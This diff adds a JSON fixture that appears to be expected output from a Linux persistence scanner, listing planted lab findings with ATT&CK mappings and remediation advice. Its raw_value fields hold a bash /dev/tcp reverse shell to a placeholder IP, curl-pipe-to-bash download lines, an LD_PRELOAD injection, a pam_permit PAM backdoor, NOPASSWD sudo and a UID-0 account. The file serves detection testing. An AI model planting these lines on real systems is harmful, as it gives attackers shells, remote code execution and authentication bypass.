@@ -1,0 +1,384 @@
+{
+ "artifact_counts": {
+  "CronCollector": 4,
+  "EnvironmentCollector": 6,
+  "KernelCollector": 0,
+  "NetworkCollector": 0,
+  "PackageCollector": 0,
+  "PamCollector": 3,
+  "ProcessCollector": 0,
+  "SSHCollector": 3,
+  "SudoersCollector": 3,
+  "SystemdCollector": 3,
+  "UserCollector": 7
+ },
+ "findings": [
+  {
+   "artifact_path": "/var/spool/cron/crontabs/ubuntils-lab",
+   "artifact_sha256": "7527b40574f6ddd489276cba3463a19ebcc41a98d4531c7ca0226bcdd6e555e0",
+   "attack": [
+    "T1053.003"
+   ],
+   "category": "persistence",
+   "confidence": 50,
+   "confidence_band": "MEDIUM",
+   "description": "Non-root user 'ubuntils-lab' has a cron entry that runs as root or uses sudo",
+   "finding_id": "4f85f452ca96d55479631cfe4ccf42aa",
+   "raw_value": "sudo /usr/bin/true ubuntils-lab",
+   "remediation_available": true,
+   "remediation_description": "Remove the offending cron entry and create a backup",
+   "rule_aliases": [],
+   "rule_id": "CRON_ROOT_EXEC",
+   "severity": "HIGH",
+   "signals": [],
+   "title": "Cron entry escalates to root"
+  },
+  {
+   "artifact_path": "/etc/cron.d/ubuntils-lab",
+   "artifact_sha256": "cb836edb4e525f26fd0deb4be4d813107f49c80ebfb133f92fd55c824a9c1079",
+   "attack": [
+    "T1053.003"
+   ],
+   "category": "persistence",
+   "confidence": 50,
+   "confidence_band": "MEDIUM",
+   "description": "A cron job (0 0 31 2 *) references a world-writable temporary directory",
+   "finding_id": "d0ac5ec1041226d324c1eec84b6a0ed6",
+   "raw_value": "/tmp/ubuntils-lab/beacon",
+   "remediation_available": true,
+   "remediation_description": "Remove the offending cron entry and create a backup",
+   "rule_aliases": [],
+   "rule_id": "CRON_TMP_PATH",
+   "severity": "HIGH",
+   "signals": [],
+   "title": "Cron job references writable temp path"
+  },
+  {
+   "artifact_path": "/etc/cron.d/ubuntils-lab-revshell",
+   "artifact_sha256": "9f88ef8322a6552ffd012d10457cfe3f92ef1c94eb9b0e7216580613a3a964e8",
+   "attack": [
+    "T1053.003",
+    "T1053.002"
+   ],
+   "category": "persistence",
+   "confidence": 90,
+   "confidence_band": "HIGH",
+   "description": "A crontab entry in /etc/cron.d/ubuntils-lab-revshell (0 0 31 2 *, runs as root) opens a reverse or bind shell",
+   "finding_id": "b01f3e7adadfe02e38178609fa637059",
+   "guided_remediation": "Preserve /etc/cron.d/ubuntils-lab-revshell first (copy it with its timestamps), then remove the entry by hand \u2014 or disable the job \u2014 once you have scoped the intrusion.",
+   "raw_value": "bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "CRON_SUSPICIOUS_COMMAND",
+   "severity": "HIGH",
+   "signals": [
+    {
+     "detail": "the command opens a reverse or bind shell (dev_tcp: bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1')",
+     "name": "reverse_shell",
+     "weight": 40
+    }
+   ],
+   "title": "Scheduled command runs a reverse shell, download or hidden payload"
+  },
+  {
+   "artifact_path": "/home/ubuntils-lab/.bashrc",
+   "artifact_sha256": "af176f3a03de77e68f6436286889eaad157020f518ba753c3ef50d66c994e107",
+   "attack": [
+    "T1574.006"
+   ],
+   "category": "persistence",
+   "confidence": 85,
+   "confidence_band": "HIGH",
+   "description": "LD_PRELOAD is set to a path outside standard library directories: /tmp/ubuntils-lab/libx.so",
+   "finding_id": "cdb043a73c0543001bebb2963ed13733",
+   "raw_value": "export LD_PRELOAD=/tmp/ubuntils-lab/libx.so",
+   "remediation_available": true,
+   "remediation_description": "Comment out the LD_PRELOAD line with a backup",
+   "rule_aliases": [],
+   "rule_id": "LD_PRELOAD_INJECT",
+   "severity": "HIGH",
+   "signals": [
+    {
+     "detail": "preloaded from a non-library directory: /tmp/ubuntils-lab/libx.so",
+     "name": "outside_standard_libs",
+     "weight": 20
+    },
+    {
+     "detail": "preloaded library sits in a world-writable temp directory",
+     "name": "writable_tmp_location",
+     "weight": 15
+    }
+   ],
+   "title": "LD_PRELOAD injection detected"
+  },
+  {
+   "artifact_path": "/etc/systemd/system/ubuntils-lab-updater.service",
+   "artifact_sha256": "0d4aef251787bf1bed5ed1bdecabf3fbe871ae46b732df63c1a50ca079651988",
+   "attack": [
+    "T1053.006",
+    "T1543.002"
+   ],
+   "category": "persistence",
+   "confidence": 65,
+   "confidence_band": "MEDIUM",
+   "description": "Systemd service 'ubuntils-lab-updater.service' ExecStart references a world-writable temp directory",
+   "finding_id": "79cbbf39ce0760d02108f603990da6c5",
+   "guided_remediation": "Inspect the unit, then disable it: `systemctl disable --now ubuntils-lab-updater.service` (review `systemctl cat ubuntils-lab-updater.service` first).",
+   "raw_value": "/tmp/ubuntils-lab/updater",
+   "remediation_available": false,
+   "rule_aliases": [
+    "SUSPICIOUS_SYSTEMD_UNIT"
+   ],
+   "rule_id": "SUSPICIOUS_SYSTEMD_TIMER",
+   "severity": "HIGH",
+   "signals": [
+    {
+     "detail": "ExecStart references a world-writable temp directory",
+     "name": "content_match",
+     "weight": 15
+    }
+   ],
+   "title": "Systemd service with suspicious ExecStart"
+  },
+  {
+   "artifact_path": "/etc/systemd/system/cron.service.d/ubuntils-lab.conf",
+   "artifact_sha256": "01990c8fb7570728cccd1e257cd777135c1ff7edd12d1dc4b5a7988fba10aa3a",
+   "attack": [
+    "T1053.006",
+    "T1543.002"
+   ],
+   "category": "persistence",
+   "confidence": 75,
+   "confidence_band": "HIGH",
+   "description": "Systemd service 'cron.service' (drop-in override /etc/systemd/system/cron.service.d/ubuntils-lab.conf) ExecStart downloads and executes code (pipe_to_interpreter)",
+   "finding_id": "445b11a8f4014122766d5ab4db82372e",
+   "guided_remediation": "Inspect the unit, then disable it: `systemctl disable --now cron.service` (review `systemctl cat cron.service` first).",
+   "raw_value": "/bin/sh -c 'curl -s http://ubuntils-lab.invalid | bash'",
+   "remediation_available": false,
+   "rule_aliases": [
+    "SUSPICIOUS_SYSTEMD_UNIT"
+   ],
+   "rule_id": "SUSPICIOUS_SYSTEMD_TIMER",
+   "severity": "HIGH",
+   "signals": [
+    {
+     "detail": "ExecStart downloads and executes code (pipe_to_interpreter)",
+     "name": "content_match",
+     "weight": 15
+    },
+    {
+     "detail": "set in a drop-in, where it overrides the unit file's own command",
+     "name": "dropin_override",
+     "weight": 10
+    }
+   ],
+   "title": "Systemd service with suspicious ExecStart"
+  },
+  {
+   "artifact_path": "/home/ubuntils-lab/.ssh/authorized_keys2",
+   "artifact_sha256": "59ceba422d40c187fd33279b6572e0e409bbe4be3d406a55c9c824b60b3eae5c",
+   "attack": [
+    "T1098.004"
+   ],
+   "category": "persistence",
+   "confidence": 70,
+   "confidence_band": "MEDIUM",
+   "description": "/home/ubuntils-lab/.ssh/authorized_keys2 (user 'ubuntils-lab') holds a key \u2014 a file few admins check, still honoured by sshd",
+   "finding_id": "13d2bd125d5d84931a2cbff05363b967",
+   "raw_value": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEm5nU3cQd1bG3Yt0xR4lQv8m2YQpZ5bZ0n9k1s3T6sB lab@k2",
+   "remediation_available": true,
+   "remediation_description": "Remove this key line from /home/ubuntils-lab/.ssh/authorized_keys2",
+   "rule_aliases": [],
+   "rule_id": "SSH_UNAUTHORIZED_KEY",
+   "severity": "MEDIUM",
+   "signals": [
+    {
+     "detail": "key lives in authorized_keys2, deprecated since OpenSSH 3.0",
+     "name": "legacy_keys_file",
+     "weight": 20
+    }
+   ],
+   "title": "SSH key in the legacy authorized_keys2 file"
+  },
+  {
+   "artifact_path": "/home/admin/.ssh/authorized_keys",
+   "artifact_sha256": "f287c2e1553c5b58e59e90f96dd0788679da90e3dabef3ee33f028f6032865cc",
+   "attack": [
+    "T1098.004"
+   ],
+   "category": "inventory",
+   "confidence": 20,
+   "confidence_band": "LOW",
+   "description": "/home/admin/.ssh/authorized_keys (user 'admin') authorizes ssh-ed25519 key SHA256:/q/ChcN+kjM/IL9fV2ANBGAj4qMMKlIfkh9w/tciaYg. Baseline it if it is known.",
+   "finding_id": "9df6797d31f93e190c3d752497f5e4ce",
+   "guided_remediation": "Check SHA256:/q/ChcN+kjM/IL9fV2ANBGAj4qMMKlIfkh9w/tciaYg against the keys you issued (`ssh-keygen -lf /home/admin/.ssh/authorized_keys`); baseline it if it is yours.",
+   "raw_value": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7Ue8bQnB6m8bPqfV1oQ3n0lJ3m1cGx7Zt0d6s2YqkA admin@laptop",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "SSH_KEY_INVENTORY",
+   "severity": "LOW",
+   "signals": [
+    {
+     "detail": "listed so every key is visible, not suspected",
+     "name": "inventory",
+     "weight": -30
+    }
+   ],
+   "title": "Authorized SSH key"
+  },
+  {
+   "artifact_path": "/home/ubuntils-lab/.ssh/authorized_keys",
+   "artifact_sha256": "fd81d65974cd6313714421e3eada528ac0709bb6bd60327c3697a72e002c6a0f",
+   "attack": [
+    "T1098.004"
+   ],
+   "category": "inventory",
+   "confidence": 50,
+   "confidence_band": "MEDIUM",
+   "description": "/home/ubuntils-lab/.ssh/authorized_keys (user 'ubuntils-lab') authorizes ssh-ed25519 key SHA256:cPNOV8WmZXJRzNjGKpHxiAY4AwmHvLvPcCHv4A/AJr8 with options command=\"/bin/true\". Baseline it if it is known.",
+   "finding_id": "3e2bc76a67b1627277d8d226778ec2ee",
+   "guided_remediation": "Check SHA256:cPNOV8WmZXJRzNjGKpHxiAY4AwmHvLvPcCHv4A/AJr8 against the keys you issued (`ssh-keygen -lf /home/ubuntils-lab/.ssh/authorized_keys`); baseline it if it is yours.",
+   "raw_value": "command=\"/bin/true\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEm5nU3cQd1bG3Yt0xR4lQv8m2YQpZ5bZ0n9k1s3T6sB deploy@ci",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "SSH_KEY_INVENTORY",
+   "severity": "LOW",
+   "signals": [
+    {
+     "detail": "listed so every key is visible, not suspected",
+     "name": "inventory",
+     "weight": -30
+    },
+    {
+     "detail": "key options present: 'command=\"/bin/true\"'",
+     "name": "content_match",
+     "weight": 30
+    }
+   ],
+   "title": "Authorized SSH key"
+  },
+  {
+   "artifact_path": "/etc/sudoers.d/ubuntils-lab",
+   "artifact_sha256": "f16a0024f4cb77201f164666b9bc6eda4195214aecf53668ff0df0500052b59a",
+   "attack": [
+    "T1548.003"
+   ],
+   "auto_remediation_blocked": "'ubuntils-lab' has no usable password (its password is locked), so removing this rule leaves it no sudo access at all; if it is an admin, that locks them out",
+   "blocked_reasons": [
+    {
+     "code": "SOLE_SUDO_ACCESS",
+     "detail": "'ubuntils-lab' has no usable password (its password is locked), so removing this rule leaves it no sudo access at all; if it is an admin, that locks them out"
+    }
+   ],
+   "category": "persistence",
+   "confidence": 50,
+   "confidence_band": "MEDIUM",
+   "description": "User 'ubuntils-lab' (uid=1001) has NOPASSWD sudo access",
+   "finding_id": "d7dbca9e6b84e37e6e0657ae96e474af",
+   "raw_value": "ubuntils-lab ALL=(ALL) NOPASSWD: ALL",
+   "remediation_available": true,
+   "remediation_description": "Remove the NOPASSWD sudoers entry and create a backup",
+   "rule_aliases": [],
+   "rule_id": "SUDOERS_NOPASSWD",
+   "severity": "MEDIUM",
+   "signals": [],
+   "title": "NOPASSWD sudoers entry for non-system user"
+  },
+  {
+   "artifact_path": "/etc/passwd",
+   "artifact_sha256": "9511cda3b3fd1a1486bbc5bd677cd3db3a6574ab007ea365582b27b0e7c9b878",
+   "attack": [
+    "T1136.001"
+   ],
+   "category": "persistence",
+   "confidence": 50,
+   "confidence_band": "MEDIUM",
+   "description": "Account 'ubuntils-lab-root' has UID 0, granting it full root privileges. Only 'root' should have UID 0.",
+   "finding_id": "e477c41c334b3356f9420c95b8cf75c0",
+   "raw_value": "ubuntils-lab-root:x:0:0:...:/usr/sbin/nologin",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "USER_UID_ZERO",
+   "severity": "HIGH",
+   "signals": [],
+   "title": "Non-root account with UID 0"
+  },
+  {
+   "artifact_path": "/home/ubuntils-lab/.bashrc",
+   "artifact_sha256": "af176f3a03de77e68f6436286889eaad157020f518ba753c3ef50d66c994e107",
+   "attack": [
+    "T1546.004"
+   ],
+   "category": "persistence",
+   "confidence": 85,
+   "confidence_band": "HIGH",
+   "description": "Shell init file '/home/ubuntils-lab/.bashrc' for user 'ubuntils-lab' contains a reverse-shell, download-and-execute, encoded-payload, shell-hijack or writable-tmp PATH line",
+   "finding_id": "3869376f7ebb31cbbb216121ae7dce91",
+   "guided_remediation": "Review recent additions to /home/ubuntils-lab/.bashrc (`diff` it against a known-good copy or `/etc/skel`), then revert any malicious lines by hand.",
+   "raw_value": "curl -fsSL http://ubuntils-lab.invalid/x | bash",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "SHELL_RC_MODIFICATION",
+   "severity": "MEDIUM",
+   "signals": [
+    {
+     "detail": "the line downloads and executes code (pipe_to_interpreter: curl -fsSL http://ubuntils-lab.invalid/x | bash)",
+     "name": "content_match",
+     "weight": 35
+    }
+   ],
+   "title": "Shell init file contains a suspicious command"
+  },
+  {
+   "artifact_path": "/etc/pam.d/ubuntils-lab",
+   "artifact_sha256": "1f27183945437829a2c5174ed513d01647888c87a8e1ed2a6e7a88ee136b63f7",
+   "attack": [
+    "T1556.003"
+   ],
+   "category": "persistence",
+   "confidence": 80,
+   "confidence_band": "HIGH",
+   "description": "'/etc/pam.d/ubuntils-lab' uses pam_permit.so in a way that can grant authentication on its own (it short-circuits the stack, or no other module can fail it) \u2014 a common backdoor technique to bypass authentication for a service",
+   "finding_id": "49f2dae64be45828ff3d5eda30a2a70f",
+   "guided_remediation": "Review /etc/pam.d/ubuntils-lab: remove the pam_permit.so line, or restore the `requisite pam_deny.so` gate in front of it",
+   "raw_value": "auth sufficient pam_permit.so",
+   "remediation_available": false,
+   "rule_aliases": [],
+   "rule_id": "PAM_BACKDOOR",
+   "severity": "HIGH",
+   "signals": [
+    {
+     "detail": "pam_permit.so can decide the auth/account stack \u2014 read from the PAM config, not inferred",
+     "name": "content_match",
+     "weight": 30
+    }
+   ],
+   "title": "PAM config unconditionally permits authentication"
+  }
+ ],
+ "scan_metadata": {
+  "architecture": "unknown (offline analysis)",
+  "baseline_suppressed": [],
+  "bundle_integrity": "live",
+  "collector_failures": 0,
+  "collectors_degraded": {},
+  "command_collectors_skipped": [
+   "NetworkCollector",
+   "SystemdCollector",
+   "PackageCollector",
+   "KernelCollector"
+  ],
+  "detection_error": null,
+  "host_id": "",
+  "hostname": "fixture",
+  "preserve": null,
+  "preserve_bundle": null,
+  "rules_failed": [],
+  "suppressed_by_allowlist": 0,
+  "suppressed_by_baseline": 0,
+  "timeline_error": null,
+  "ubuntu_version": "Ubuntu 24.04.3 LTS"
+ },
+ "schema_version": "3.0",
+ "timeline": []
+}
